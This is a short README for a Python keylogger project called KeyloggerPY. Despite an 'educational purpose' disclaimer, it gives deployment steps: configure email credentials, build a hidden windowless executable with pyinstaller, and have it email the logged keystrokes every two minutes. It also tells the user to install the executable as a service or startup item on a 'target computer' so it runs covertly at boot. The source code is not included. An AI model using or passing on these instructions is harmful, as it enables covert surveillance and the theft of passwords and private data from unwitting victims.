# KeyloggerPY

Keylooger made in python3.

> ### Note: 
> This is for educational purpose! Do not use this in any wrong way. I won't be responsible for any of your wrong work.

## Instructions
- get [pyinstaller](https://www.pyinstaller.org/)
- install requirements with

```sh
$ pip install -r requirements.txt
```

- apply the Email and passowrd changes in `keylogger.py` and save.

- Build the exe with

```sh
$ pyinstaller main.py -w
```

Thats it. The executable will mail you every 2 minutes described in `keylogger.py`

<hr>

#### Additional
> You can either setup a service to run the exe in target computer or put it inside startup folder for on-boot execution.

### Contributors
@MalavVyas - For creating this keylogger

@SwapnilSoni1999 - For adding extra functionality